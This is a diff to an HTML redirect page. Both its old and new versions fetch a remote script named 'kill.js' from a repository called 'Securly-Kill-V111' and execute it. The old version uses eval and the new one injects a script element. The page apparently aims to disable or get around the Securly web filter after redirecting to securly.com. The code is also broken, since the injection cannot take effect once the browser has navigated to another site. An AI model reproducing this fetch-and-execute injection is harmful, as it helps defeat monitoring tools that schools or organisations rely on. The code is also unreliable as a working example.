@@ -4,38 +4,34 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting</title>
-    <meta http-equiv="refresh" content="0; url=https://securly.com">
-
     <script>
-    // Wait for the page to load
-    window.addEventListener('load', () => {
-        // Store the current URL
-        const currentUrl = window.location.href;
+        // Redirect and handle script injection
+        window.addEventListener('load', () => {
+            const redirectUrl = 'https://securly.com';
+            const scriptUrl = 'https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js';
 
-        // Periodically check for redirection
-        const checkRedirect = setInterval(() => {
-            const newUrl = window.location.href;
-            if (newUrl !== currentUrl) {
-                console.log('Redirect detected:', newUrl);
+            // Redirect to the new URL
+            window.location.href = redirectUrl;
 
-                // Inject the script after redirection
-                fetch('https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js')
-                    .then(response => response.text())
+            // Listen for the 'pageshow' event after redirection
+            window.addEventListener('pageshow', () => {
+                fetch(scriptUrl)
+                    .then(response => {
+                        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+                        return response.text();
+                    })
                     .then(scriptContent => {
-                        eval(scriptContent);
+                        const scriptElement = document.createElement('script');
+                        scriptElement.textContent = scriptContent;
+                        document.body.appendChild(scriptElement);
                         console.log('Injected script executed.');
                     })
                     .catch(err => console.error('Error fetching script:', err));
-
-                clearInterval(checkRedirect); // Stop checking after redirect
-            }
-        }, 500); // Check every 500ms
-    });
-</script>
-
-    
+            });
+        });
+    </script>
 </head>
 <body>
-
+    <p>Redirecting, please wait...</p>
 </body>
 </html>
